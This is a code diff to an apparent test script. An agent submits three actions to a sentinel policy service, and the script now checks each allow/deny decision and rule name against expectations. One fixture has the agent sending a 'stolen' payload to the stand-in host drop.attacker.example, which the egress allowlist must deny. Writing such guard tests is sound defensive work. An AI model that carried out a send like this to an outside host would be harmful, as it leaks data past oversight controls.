@@ -26,14 +26,21 @@ def main() -> None:
     time.sleep(1.0)  # let the sentinel come up
     me = "agent-1"
     attempts = [
-        ("file_read", {"path": "/work/input/task.json"}),
-        ("net_send",  {"host": "api.internal.svc", "payload": "result ok"}),
-        ("net_send",  {"host": "drop.attacker.example", "payload": "stolen"}),  # must DENY
+        ("file_read", {"path": "/work/input/task.json"}, True, "fs-read-scope"),
+        ("net_send",  {"host": "api.internal.svc", "payload": "result ok"},
+         True, "egress-allowlist"),
+        ("net_send",  {"host": "drop.attacker.example", "payload": "stolen"},
+         False, "egress-allowlist"),
     ]
-    for type_, params in attempts:
+    for type_, params, expected_allow, expected_rule in attempts:
         d = submit(me, type_, **params)
         verb = "ALLOW" if d["allow"] else "DENY "
         print(f"[{verb}] {type_:<10} {params} :: {d['rule']}", flush=True)
+        if d["allow"] is not expected_allow or d["rule"] != expected_rule:
+            raise RuntimeError(
+                f"unexpected sentinel decision: {d!r}; "
+                f"expected allow={expected_allow}, rule={expected_rule}"
+            )
 
 
 if __name__ == "__main__":
